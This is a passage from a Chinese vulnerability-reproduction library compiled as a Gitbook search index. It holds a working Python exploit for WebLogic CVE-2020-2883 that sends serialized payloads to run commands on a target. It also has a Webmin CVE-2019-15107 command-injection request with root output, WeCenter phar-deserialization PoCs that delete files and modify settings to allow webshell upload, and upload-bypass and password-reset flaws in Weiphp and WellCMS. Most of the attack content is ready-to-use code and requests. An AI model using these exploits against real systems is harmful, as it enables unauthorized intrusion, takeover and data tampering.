96f6e496e666f972245516452463e0200035b00087061636b6167657371' data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd60000000700001b19ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07' data3 = '1a7727000d3234322e323134' data4 = '2e312e32353461863d1d0000000078' for d in [data1,data2,data3,data4]: sock.send(d.decode('hex')) time.sleep(2) #print 'send request payload successful,recv length:%d'%(len(sock.recv(2048))) def sendEvilObjData(self,sock,data): payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' payload+=data payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff' payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload) sock.send(payload.decode('hex')) time.sleep(2) sock.send(payload.decode('hex')) res = '' n=1 try: while True: n += 1 res += sock.recv(4096) time.sleep(0.1) if(n>15): break except Exception as e: pass return res def check(self, url, cmd,timeout, proxies=globalProxies, **args): (proto, ip, port, uri) = parseUrl(url) server_addr = (ip, int(port)) if proto == 'https': sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) else: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(timeout) try: self.t3handshake(sock,server_addr) self.buildT3RequestObject(sock,port) payload = CVE_2020_2883(cmd) resp = self.sendEvilObjData(sock,payload) print ('[+] Payload send succeed! Please check.') return True except Exception as e: print ('[-] Failed! Exception:{}'.format(str(e))) return False def poc(url,cmd): x = payloadtest() return x.check(url, cmd,20) if __name__ == '__main__': parser = argparse.ArgumentParser(description='Weblogic cve-2020-2883 Exp', usage='use \"python %(prog)s --help\" for more information', formatter_class=argparse.RawTextHelpFormatter) parser.add_argument(\"-u\", \"--url\", dest=\"url\", help=\"the url to check\" ) parser.add_argument(\"-c\", \"--cmd\", dest=\"cmd\", help=\"the cmd to run on the target\" ) args = parser.parse_args() if not args.url or not args.cmd: sys.exit('[*] Please assign url and cmd! \\n[*] Examples python cve-2020-2883_cmd.py -u http://127.0.0.1:7001 -c calc') poc(args.url, args.cmd) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:13 "},"Web安全/Weblogic/weblogic爆破/weblogic爆破.html":{"url":"Web安全/Weblogic/weblogic爆破/weblogic爆破.html","title":"weblogic爆破","keywords":"","body":"weblogic爆破 一、部署weblogic 现有的redhat环境7.0,jdk版本1.7。 二、weblogic下载 操作系统：RedHat7 weblogic版本：10.3.6 三、安装weblogic 1、weblogic安装 创建一个用户 useradd weblogic passwd weblogic chmod a+x wls1036_generic.jar su weblogic java -jar wls1036_generic.jar -mode=console 出现问题 提示空间内存大小不够，清理空间再下一步。 [root\\@localhostsrc]# cd /usr/lib/jvm/java-1.7.0-openjdk-1.7.0.51-2.4.5.5.el7.x86_64 修改 commEnv.sh 文件 JAVA_HOME=\\\"/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.9.x86_64/ jre\\\" 2、启动weblogic [weblogic\\@localhostroot]$cd /home/weblogic/Oracle/Middleware/user_projects/domains/base_domain/ [weblogic\\@localhost base_domain]$ ./startWebLogic.sh 在目录/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.79.x86_64中找不到JRE 编辑setDomainEnv.sh 重新启动weblogic服务 四、破解weblogic控制台密码 第一步 将用户名和密码保存到boot.properties文件中 [root\\@localhost security]# pwd /home/weblogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security 在adminserver目录下创建security目录，并创建文件boot.properties Username=weblogic Password=weblogic123 第二步 重新启动WebLogic服务 [root\\@localhost bin]# ./startWebLogic.sh& 已经加密 第三步 暴力破解 1.java和javac的版本一致 2.编译WebLogicPasswordDecryptor.java 3.破解密码 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:50 "},"Web安全/Webmin/（CVE-2019-15107）Webmin 远程命令执行漏洞/（CVE-2019-15107）Webmin 远程命令执行漏洞.html":{"url":"Web安全/Webmin/（CVE-2019-15107）Webmin 远程命令执行漏洞/（CVE-2019-15107）Webmin 远程命令执行漏洞.html","title":"（CVE-2019-15107）Webmin 远程命令执行漏洞","keywords":"","body":"（CVE-2019-15107）Webmin 远程命令执行漏洞 一、漏洞简介 Webmin是一个用于管理类Unix系统的管理配置工具，具有Web页面。在其找回密码页面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。 二、漏洞影响 Webmin \\ 三、复现过程 环境搭建 执行如下命令，启动webmin 1.910： docker-compose up -d 执行完成后，访问https://0-sec.org:10000，忽略证书后即可看到webmin的登录页面。 复现 参考链接中的数据包是不对的，经过阅读代码可知，只有在发送的user参数的值不是已知Linux用户的情况下（而参考链接中是user=root），才会进入到修改/etc/shadow的地方，触发命令注入漏洞。 发送如下数据包，即可执行命令id： POST /password_change.cgi HTTP/1.1 Host: 0-sec.org:10000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Cookie: redirect=1; testing=1; sid=x; sessiontest=1 Referer: https://your-ip:10000/session_login.cgi Content-Type: application/x-www-form-urlencoded Content-Length: 60 user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2 Webmin远程命令执行漏洞/media/rId27.png) python usage: python CVE_2019_15107.py https://0-sec.org:10000 cmd C:\\Users\\CTF\\Desktop>python CVE_2019_15107.py https://10.10.20.166:10000 id _______ _______ _______ _______ __ _____ __ _______ __ _______ ______ ( ____ \\|\\ /|( ____ \\ / ___ )( __ )/ \\ / ___ \\ / \\ ( ____ \\/ \\ ( __ )/ ___ | ( \\/| ) ( || ( \\/ \\/ ) || ( ) |\\/) ) ( ( ) ) \\/) ) | ( \\/\\/) ) | ( ) |\\/ ) ) | | | | | || (__ / )| | / | | | ( (___) | | | | (____ | | | | / | / / | | ( ( ) )| __) _/ / | (/ /) | | | \\____ | | | (_____ \\ | | | (/ /) | / / | | \\ \\_/ / | ( / _/ | / | | | | ) | | | ) ) | | | / | | / / | (____/\\ \\ / | (____/\\ ( (__/\\| (__) |__) (_/\\____) ) __) (_/\\____) )__) (_| (__) | / / (_______/ \\_/ (_______/_____\\_______/(_______)\\____/\\______/_____\\____/\\______/ \\____/(_______) \\_/ (_____) (_____) python By jas502n vuln_url= https://0-sec.org:10000/password_change.cgi Command Result = uid=0(root) gid=0(root) groups=0(root) 四、参考链接 https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html https://www.exploit-db.com/exploits/47230 https://blog.firosolutions.com/exploits/webmin/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:20 "},"Web安全/WebSphere/CVE-2020-4276 4362 IBM WebSphere远程代码执行漏洞/CVE-2020-4276 4362 IBM WebSphere远程代码执行漏洞.html":{"url":"Web安全/WebSphere/CVE-2020-4276 4362 IBM WebSphere远程代码执行漏洞/CVE-2020-4276 4362 IBM WebSphere远程代码执行漏洞.html","title":"CVE-2020-4276 4362 IBM WebSphere远程代码执行漏洞","keywords":"","body":"CVE-2020-4276 4362 IBM WebSphere远程代码执行漏洞 简介 WebSphere SOAP Connector 是什么服务？ WebSphere SOAP Connector 服务用于管理远程节点和数据同步，因此主要是在服务器与服务器之间进行通信。它的默认监听地址为 0.0.0.0:8880。 CVE-2020-4276 和 CVE-2020-4362 漏洞编号的由来？ 长亭科技于今年一月份的时候向 IBM 官方报告了此漏洞，随后官方确认了漏洞，发布对应的补丁 PH21511，分配漏洞编号 CVE-2020-4276。但我们马上发现补丁 PH21511 似乎并未起到漏洞修复的效果，于是再次与官方沟通，经过最终确认后，官方再次发布补丁 PH23853，分配漏洞编号 CVE-2020-4362。因此这两个 CVE 编号，实际上是同一个漏洞。 远程且未经授权的攻击者通过成功利用此漏洞，可以在目标服务端执行任意恶意代码，获取系统权限。 哪些版本的 WebSphere 受到 CVE-2020-4276、CVE-2020-4362 漏洞影响？ • WebSphere Application Server 9.0.x • WebSphere Application Server 8.5.x • WebSphere Application Server 8.0.x • WebSphere Application Server 7.0.x 什么情况下的WebSphere可以被 CVE-2020-4276、CVE-2020-4362 漏洞利用？ 对于受漏洞影响的 WebSphere 来说，如果攻击者可以访问到其 SOAP Connector 服务端口，即存在被漏洞利用的风险（WebSphereSOAP Connector 默认监听地址为 0.0.0.0:8880，且此漏洞的利用无额外条件限制）。 由于WebSphere SOAP Connector 主要用于服务器之间的通信，因此多见于企业内网环境中。 漏洞利用 暂无 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:20 "},"Web安全/WebSphere/CVE-2020-4450 IBM WebSphere IIOP协议远程代码执行漏洞/CVE-2020-4450 IBM WebSphere IIOP协议远程代码执行漏洞.html":{"url":"Web安全/WebSphere/CVE-2020-4450 IBM WebSphere IIOP协议远程代码执行漏洞/CVE-2020-4450 IBM WebSphere IIOP协议远程代码执行漏洞.html","title":"CVE-2020-4450 IBM WebSphere IIOP协议远程代码执行漏洞","keywords":"","body":"CVE-2020-4450 IBM WebSphere IIOP协议远程代码执行漏洞 简介 IBM® WebSphere® Application Server 是一种高性能的 Java 应用服务器，可用于构建、运行、集成、保护和管理内部部署和/或外部部署的动态云和 Web 应用。2020年6月IBM官方发布了 WebSphere远程代码执行 的风险通告，该漏洞编号为 CVE-2020-4450，攻击者可构造特殊的iiop数据包发送至WebSphere服务器默认的2809和9100端口，来执行任意代码和命令并接管服务器，漏洞影响版本范围为9.0.0.0 - 9.0.5.4、8.5.0.0 - 8.5.5.17、8.0.0.0 - 8.0.0.15、7.0.0.0 - 7.0.0.45 漏洞利用 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:21 "},"Web安全/WebSphere/CVE-2020-4643 IBM WebSphere存在XXE外部实体注入漏洞/CVE-2020-4643 IBM WebSphere存在XXE外部实体注入漏洞.html":{"url":"Web安全/WebSphere/CVE-2020-4643 IBM WebSphere存在XXE外部实体注入漏洞/CVE-2020-4643 IBM WebSphere存在XXE外部实体注入漏洞.html","title":"CVE-2020-4643 IBM WebSphere存在XXE外部实体注入漏洞","keywords":"","body":"CVE-2020-4643 IBM WebSphere存在XXE外部实体注入漏洞 漏洞分析： IBM WebSphere 应用程序服务器7.0、8.0、8.5 和9.0 在处理XML 数据时容易受到XML 外部实体注入（XXE） 攻击。远程攻击者可以利用此漏洞公开敏感信息。IBM Xforce ID：185590。 影响范围: WebSphere Application Server 7.0版本 WebSphere Application Server 8.0版本 WebSphere Application Server 8.5版本 WebSphere Application Server 9.0版本 修复建议： 官方已经提供的补丁版本列表： WebSphere 9.0.0.0 - 9.0.5.5版本，建议升级到9.0.5.6以上版本或安装补丁 WebSphere 8.5.0.0 - 8.5.5.17版本，建议升级到8.5.5.19以上版本或安装补丁 WebSphere 8.0.0.0 - 8.0.0.15版本，建议先升级到8.0.0.15版本再安装补丁 WebSphere 7.0.0.0 - 7.0.0.45 版本，建议先升级到7.0.0.45版本再安装补丁 xml如下： %bbb; ]> &ddd; xx.dtd如下： '>'>%ccc; Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:22 "},"Web安全/WeCenter/WeCenter 3.3.4 任意文件删除/WeCenter 3.3.4 任意文件删除.html":{"url":"Web安全/WeCenter/WeCenter 3.3.4 任意文件删除/WeCenter 3.3.4 任意文件删除.html","title":"WeCenter 3.3.4 任意文件删除","keywords":"","body":"WeCenter 3.3.4 任意文件删除 一、漏洞简介 二、漏洞影响 WeCenter 3.3.4 三、复现过程 任意文件删除 system/Zend/Http/Response/Stream.php:__destruct() 方法中存在任意文件删除。 poc _cleanup = true; $this->stream_name = $stream_name; } } $stream_name = '/var/www/html/wecenter334/shell.php'; $evilobj = new Zend_Http_Response_Stream($stream_name); // phar.readonly无法通过该语句进行设置: init_set(\"phar.readonly\",0); $filename = 'poc.phar';// 后缀必须为phar，否则程序无法运行 file_exists($filename) ? unlink($filename) : null; $phar=new Phar($filename); $phar->startBuffering(); $phar->setStub(\"GIF89a\"); $phar->setMetadata($evilobj); $phar->addFromString(\"foo.txt\",\"bar\"); $phar->stopBuffering(); ?> Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:23 "},"Web安全/WeCenter/WeCenter 3.3.4 前台sql注入/WeCenter 3.3.4 前台sql注入.html":{"url":"Web安全/WeCenter/WeCenter 3.3.4 前台sql注入/WeCenter 3.3.4 前台sql注入.html","title":"WeCenter 3.3.4 前台sql注入","keywords":"","body":"WeCenter 3.3.4 前台sql注入 一、漏洞简介 二、漏洞影响 WeCenter 3.3.4 三、复现过程 任意sql语句执行 system/aws_model.inc.php:__destruct() 方法中存在任意 SQL 语句执行。 poc _shutdown_query = $_shutdown_query; } } $sql = array('select updatexml(1,concat(0x3a,md5(233),0x3a),1)'); $evilobj = new AWS_MODEL($sql); // phar.readonly无法通过该语句进行设置: init_set(\"phar.readonly\",0); $filename = 'poc.phar';// 后缀必须为phar，否则程序无法运行 file_exists($filename) ? unlink($filename) : null; $phar=new Phar($filename); $phar->startBuffering(); $phar->setStub(\"GIF89a\"); $phar->setMetadata($evilobj); $phar->addFromString(\"foo.txt\",\"bar\"); $phar->stopBuffering(); ?> 利用 首先注册账号，并利用上面的poc生成Phar文件，并将运行后将生成的shell.gif通过编辑器的上传功能上传到服务器上。 记录下上传后的目录 生成并设置COOKIE中的WXConnect值 '1'); $arr['access_user'] = array(); $arr['access_user']['openid'] = 1; $arr['access_user']['nickname'] = 'naiquan'; $arr['access_user']['headimgurl'] = 'phar://uploads/question/20200107/a3df6f75e11120c22ba0d85519c5d442.gif'; echo json_encode($arr); ?> 将headimgurl的值设置成phar伪协议解析的恶意文件后运行，将结果放入Cookie中，前缀可参考Cookie中的其他参数。 访问app/m/weixin.php下的binding_action 提示绑定微信成功后进行下一步 访问app/account/ajax.php下的synch_img_action 任意 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:23 "},"Web安全/WeCenter/WeCenter 3.3.4 远程命令执行/WeCenter 3.3.4 远程命令执行.html":{"url":"Web安全/WeCenter/WeCenter 3.3.4 远程命令执行/WeCenter 3.3.4 远程命令执行.html","title":"WeCenter 3.3.4 远程命令执行","keywords":"","body":"WeCenter 3.3.4 远程命令执行 一、漏洞简介 二、漏洞影响 WeCenter 3.3.4 三、复现过程 远程命令执行 WeCenter 后台的 允许的附件文件类型 处，设置了用户可上传的文件类型后缀。而这个配置是写在数据库中的，我们可以利用前面的任意 SQL 语句执行的 POP 链，往字段中添加 php 文件后缀。 poc _shutdown_query = $_shutdown_query; } } $sql = array('update aws_system_setting set value=\\'s:45:\"jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php\";\\' where varname=\\'allowed_upload_types\\''); $evilobj = new AWS_MODEL($sql); // phar.readonly无法通过该语句进行设置: init_set(\"phar.readonly\",0); $filename = 'poc.phar';// 后缀必须为phar，否则程序无法运行 file_exists($filename) ? unlink($filename) : null; $phar=new Phar($filename); $phar->startBuffering(); $phar->setStub(\"GIF89a\"); $phar->setMetadata($evilobj); $phar->addFromString(\"foo.txt\",\"bar\"); $phar->stopBuffering(); ?> 利用 这里以 RCE 利用为例子。我们先用上面的 EXP 生成文件，然后找个可以上传文件的地方。这里要注意，一定不要选择在用户头像处上传。这里我们通过发起问题的地方来上传文件。 通过如下数据包，将 headimgurl 插入数据库中（ Cookie 前缀每个网站都不一样，修改成自己的即可）。 GET /wecenter334/?/m/weixin/binding/ HTTP/1.1 Host: 0.0.0.0 Cookie: XDEBUG_SESSION=PHPSTORM; Hm_lvt_f8d0a8c400404989e195270b0bbf060a=1578564275,1578582675,1578897163; UM_distinctid=16fa7f15a43278-0cbd6002fe98e4-31730657-100200-16fa7f15a44385; xhj__Session=akl7d5skae6ebea69bp8r1b4f0; CNZZDATA1273638993=564846603-1579067041-%7C1579097763; xhj__user_login=NcIFvaZbkaxoQfofEGo%2FSOCyrXq5R0lZofmF9uqaJHO5tpVyag7GEP3fdh9hKvPUf8Xj4x3kkxgLXcf1L4wocSQu9BUquhozfdiEN2Hfg8vj73XVn1f09yLfbpfbVs7K; xhj__WXConnect={\"access_token\":{\"openid\":1},\"access_user\":{\"headimgurl\":\"phar:\\/\\/uploads\\/question\\/20200116\\/f39510a7e8e47e3e4dcabbadeedd12f7.gif\",\"nickname\":\"mochazz\"}} Connection: close $wx = array( 'access_token' => array('openid'=>1), 'access_user' => array('headimgurl'=>'phar:///uploads/question/20200116/f39510a7e8e47e3e4dcabbadeedd12f7.gif','nickname'=>'mochazz') ); echo json_encode($wx); 接着通过如下数据包触发 phar反序列化 执行 SQL 语句。 GET /wecenter334/?/account/ajax/synch_img/ HTTP/1.1 Host: 0.0.0.0 Cookie: XDEBUG_SESSION=PHPSTORM; Hm_lvt_f8d0a8c400404989e195270b0bbf060a=1578564275,1578582675,1578897163; UM_distinctid=16fa7f15a43278-0cbd6002fe98e4-31730657-100200-16fa7f15a44385; xhj__Session=qb72k9k1sl53gqibbg53nf32o1; CNZZDATA1273638993=564846603-1579067041-%7C1579137884; xhj__user_login=N9hSYaQOjPMdtxOXo9jQuCVQSykmK88gl3DTI4AmL%2BnhLpgnHFGGSHkzxAPYaVMbXo%2FAndADc%2FaD0wytUEK71YrLmxWCuEZDCSwn9b0ApyOpcIKa6E4cOotHqZpZwVq%2B Connection: close 现在，我们就可以随意上传 webshell 了。 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:25 "},"Web安全/Weiphp5.0/Weiphp5.0上传getshell/Weiphp5.0上传getshell.html":{"url":"Web安全/Weiphp5.0/Weiphp5.0上传getshell/Weiphp5.0上传getshell.html","title":"Weiphp5.0上传getshell","keywords":"","body":"Weiphp5.0上传getshell 漏洞描述 Weiphp5.0存在文件上传漏洞，可直接getshell 漏洞影响 Weiphp5.0 FOFA body=”weiphp5.0” 漏洞复现 首先在application\\common.php 该文件发现上传函数，其验证方式为type=picture，如果type=picture则进行文件验证。 搜索该函数，发现file.php调用该函数，并且type为download，type为download则不进行验证，最后追踪upload函数看看是否调用该函数。 发现调用该函数，并且返回json数据 构造html表单提交上传 Filename: 用表单进行提交，上传成功（由于该代码有验证是否为php，所以空格绕过即可） 进行访问，可以看到访问成功。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:27 "},"Web安全/WellCMS/WellCMS 1.1.02 任意用户密码重置漏洞/WellCMS 1.1.02 任意用户密码重置漏洞.html":{"url":"Web安全/WellCMS/WellCMS 1.1.02 任意用户密码重置漏洞/WellCMS 1.1.02 任意用户密码重置漏洞.html","title":"WellCMS 1.1.02 任意用户密码重置漏洞","keywords":"","body":"WellCMS 1.1.02 任意用户密码重置漏洞 一、漏洞简介 二、漏洞影响 WellCMS 1.1.02 三、复现过程 漏洞分析 CMS中密码重置逻辑代码存放于 /route/user.php 中，在没有配置邮件服务情况加，我们可以在生成验证码后增加 message(0, '重置密码验证码为：'.$code);代码弹出验证码，修改后需删除 /route/route_user.php 原缓存文件，重新执行弹出验证码代码便会生效，详细代码如下： // 重设密码第 1 步 | reset password first step if ($action == 'resetpw') { // hook user_resetpw_get_post.php !$conf['user_resetpw_on'] AND message(-1, '未开启密码找回功能！'); if ($method == 'GET') { // hook user_resetpw_get_start.php $header['title'] = lang('resetpw'); // hook user_resetpw_get_end.php include _include(APP_PATH . 'view/htm/user_resetpw.htm'); } else if ($method == 'POST') { // hook user_resetpw_post_start.php $email = param('email'); empty($email) AND message('email', lang('please_input_email')); !is_email($email, $err) AND message('email', $err); $_user = user_read_by_email($email); !$_user AND message('email', lang('email_is_not_in_use')); $code = param('code'); empty($code) AND message('code', lang('please_input_verify_code')); $sess_email = _SESSION('user_resetpw_email'); $sess_code = _SESSION('user_resetpw_code'); empty($sess_code) AND message('code', lang('click_to_get_verify_code')); empty($sess_email) AND message('code', lang('click_to_get_verify_code')); $email != $sess_email AND message('code', lang('verify_code_incorrect')); $code != $sess_code AND message('code', lang('verify_code_incorrect')); $_SESSION['resetpw_verify_ok'] = 1; // hook user_resetpw_post_end.php message(0, lang('check_ok_to_next_step')); } // 重设密码第 3 步 | reset password step 3 } elseif ($action == 'resetpw_complete') { // hook user_resetpw_get_post.php // 校验数据 $email = _SESSION('user_resetpw_email'); $resetpw_verify_ok = _SESSION('resetpw_verify_ok'); (empty($email) || empty($resetpw_verify_ok)) AND message(-1, lang('data_empty_to_last_step')); $_user = user_read_by_email($email); empty($_user) AND message(-1, lang('email_not_exists')); $_uid = $_user['uid']; if ($method == 'GET') { // hook user_resetpw_get_start.php $header['title'] = lang('resetpw'); // hook user_resetpw_get_end.php include _include(APP_PATH . 'view/htm/user_resetpw_complete.htm'); } else if ($method == 'POST') { // hook user_resetpw_post_start.php $password = param('password'); empty($password) AND message('password', lang('please_input_password')); $salt = $_user['salt']; $password = md5($password . $salt); !is_password($password, $err) AND message('password', $err); user_update($_uid, array('password' => $password)); unset($_SESSION['user_resetpw_email']); unset($_SESSION['user_resetpw_code']); unset($_SESSION['resetpw_verify_ok']); // hook user_resetpw_post_end.php message(0, lang('modify_successfully')); } // 发送验证码 } elseif ($action == 'send_code') { $method != 'POST' AND message(-1, lang('method_error')); // hook user_sendcode_start.php $action2 = param(2); // 重置密码，往老地址发送 if ($action2 == 'user_resetpw') { $email = param('email'); empty($email) AND message('email', lang('please_input_email')); !is_email($email, $err) AND message('email', $err); $_user = user_read_by_email($email); empty($_user) AND message('email', lang('email_is_not_in_use')); empty($conf['user_resetpw_on']) AND message(-1, lang('resetpw_not_on')); $code = rand(100000, 999999); $_SESSION['user_resetpw_email'] = $email; $_SESSION['user_resetpw_code'] = $code; message(0, '重置密码验证码为：'.$code); } }   梳理密码重置逻辑流程图如下（黑色实现箭头为漏洞利用的简单思路步骤）： 从逻辑中可以看出，在第三部中，重置密码仅进行了简单的SESSION中存储数据是否为空的验证，而并未对密码重置用户邮箱进行严格验证；若重置密码时，SESSION中存储的邮箱非当前验证用户邮箱，便会造成任意密码重置漏洞； 漏洞复现 在此程序中，在获取验证码时刷新当前SESSION中存储的密码重置用户邮箱，而未对SESSION中resetpw_verify_ok数据进行清除，也因此造成了任意用户密码重置逻辑漏洞。   我们先使用自己的账户通过验证进入第三步的用户重设密码界面；在此时，SESSION中user_resetpw_email是当前通过验证的攻击账户邮箱，SESSION中resetpw_verify_ok值为1，浏览器界面如下图所示： 在第三步时，我们可以在浏览器中打开一个新的标签页，使用管理员的邮箱发送重置密码验证码请求，在同一浏览器中SESSION会话不会改变，此时 $_SESSION['user_resetpw_email'] = $email;代码会将SESSION中存储的密码重置邮箱更新为管理员邮箱，如下图所示：  回到第一个标签页，刷新页面可以发现当前SESSION中存储的密码重置用户邮箱已经变为管理员用户邮箱（非必须刷新，密码重置第三部中邮箱取自SESSION，并非提交参数），我们提交重设密码请求后，即可更改管理员用户密码，如下图所示： 参考链接 http://www.shexink.top/2020/03/wellcms%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e5%af%86%e7%a0%81%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:34 "},"Web安全/WellCMS/WellCMS 2.0 Beta3 后台任意文件上传/WellCMS 2.0 Beta3 后台任意文件上传.html":{"url":"Web安全/WellCMS/WellCMS 2.0 Beta3 后台任意文件上传/WellCMS 2.0 Beta3 后台任意文件上传.html","title":"WellCMS 2.0 Beta3 后台任意文件上传","keywords":"","body":"WellCMS 2.0 Beta3 后台任意文件上传 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 根据漏洞定位代码文件：route/attach.php，代码如下： if ($action == 'create') { // hook attach_create_start.php user_login_check(); // hook attach_create_check_after.php $backstage = param(2, 0); $width = param('width', 0); $height = param('height', 0); $is_image = param('is_image', 0); // 图片 $name = param('name'); $data = param_base64('data'); $mode = param('mode', 0); // 上传类型 1主图 $filetype = param('filetype'); // 压缩图片后缀jpeg jpg png等 $convert = param('convert', 0); // 图片转换压缩 = 1 $n = param('n', 0); // 对应主图赋值 $type = param('type', 0); // type = 0则按照SESSION数组附件数量统计，type = 1则按照传入的n数值 // hook attach_create_before.php // 允许的文件后缀名 //$types = include _include(APP_PATH.'conf/attach.conf.php'); //$allowtypes = $types['all']; empty($group['allowattach']) AND $gid != 1 AND message(2, '您无权上传'); // hook attach_create_center.php empty($data) AND message(1, lang('data_is_empty')); //$data = base64_decode_file_data($data); $size = strlen($data); $size > 20480000 AND message(1, lang('filesize_too_large', array('maxsize' => '20M', 'size' => $size))); // hook attach_create_file_ext_start.php // 获取文件后缀名 111.php.shtmll $ext = file_ext($name, 7); $filetypes = include APP_PATH . 'conf/attach.conf.php'; // hook attach_create_file_ext_before.php //主图必须为图片 if ($is_image == 1 && $mode == 1 && !in_array($ext, $filetypes['image'])) message(1, lang('well_up_picture_error')); // hook attach_create_file_ext_center.php // 如果文件后缀不在规定范围内 改变后缀名 //!in_array($ext, $filetypes['all']) AND $ext = '_' . $ext; if (!in_array($ext, $filetypes['all'])) { $ext = '_' . $ext; } else { // CMS上传图片 $t == 1 AND $convert == 1 AND $is_image == 1 AND $ext = $filetype; } // hook attach_create_file_ext_after.php $tmpanme = $uid . '_' . xn_rand(15) . '.' . $ext; // hook attach_create_tmpanme_after.php $tmpfile = $conf['upload_path'] . 'tmp/' . $tmpanme; // hook attach_create_tmpfile_after.php $tmpurl = $conf['upload_url'] . 'tmp/' . $tmpanme; // hook attach_create_tmpurl_after.php $filetype = attach_type($name, $filetypes); // hook attach_create_save_before.php file_put_contents($tmpfile, $data) OR message(1, lang('write_to_file_failed')); // hook attach_create_save_after.php // 保存到 session，发帖成功以后，关联到帖子。 // save attach information to session, associate to post after create thread. // 抛弃之前的 $_SESSION 数据，重新启动 session，降低 session 并发写入的问题 // Discard the previous $_SESSION data, restart the session, reduce the problem of concurrent session write sess_restart(); empty($t) AND empty($_SESSION['tmp_files']) AND $_SESSION['tmp_files'] = array(); $t == 1 AND empty($_SESSION['tmp_website_files']) AND $_SESSION['tmp_website_files'] = array(); // hook attach_create_after.php // type = 0则按照SESSION数组附件数量统计，type = 1则按照传入的n数值 empty($type) AND $n = ($t == 1) ? count($_SESSION['tmp_website_files']) : count($_SESSION['tmp_files']); $filesize = filesize($tmpfile); $attach = array( 'backstage' => $backstage, // 0前台 1后台 'url' => $backstage ? '../' . $tmpurl : '' . $tmpurl, 'path' => $tmpfile, 'orgfilename' => $name, 'filetype' => $filetype, 'filesize' => $filesize, 'width' => $width, 'height' => $height, 'isimage' => $is_image, 'downloads' => 0, 'aid' => '_' . $n ); // hook attach_create_array_after.php if ($mode == 1) { // hook attach_create_thumbnail_beofre.php $_SESSION['tmp_thumbnail'] = $attach; // hook attach_create_thumbnail_after.php } else { // hook attach_create_website_files_beofre.php // 0 BBS 1 CMS $t == 1 ? $_SESSION['tmp_website_files'][$n] = $attach : $_SESSION['tmp_files'][$n] = $attach; // hook attach_create_website_files_after.php } // hook attach_create_session_after.php unset($attach['path']); // hook attach_create_end.php message(0, $attach); } 大致流程：1、 首先，接受相关参数，将filetype自行设置成\"php\"： $data = param_base64('data'); $filetype = param('filetype'); / 2、 进行逻辑判断： if (!in_array($ext, $filetypes['all'])) { $ext = '_' . $ext; } else { // CMS上传图片 $t == 1 AND $convert == 1 AND $is_image == 1 AND $ext = $filetype; } 3、 最后成功写入： $tmpanme = $uid . '_' . xn_rand(15) . '.' . $ext; // hook attach_create_tmpanme_after.php $tmpfile = $conf['upload_path'] . 'tmp/' . $tmpanme; // hook attach_create_tmpfile_after.php $tmpurl = $conf['upload_url'] . 'tmp/' . $tmpanme; // hook attach_create_tmpurl_after.php $filetype = attach_type($name, $filetypes); // hook attach_create_save_before.php file_put_contents($tmpfile, $data) OR message(1, lang('write_to_file_failed')); 漏洞复现 第一步，登陆该CMS后台： 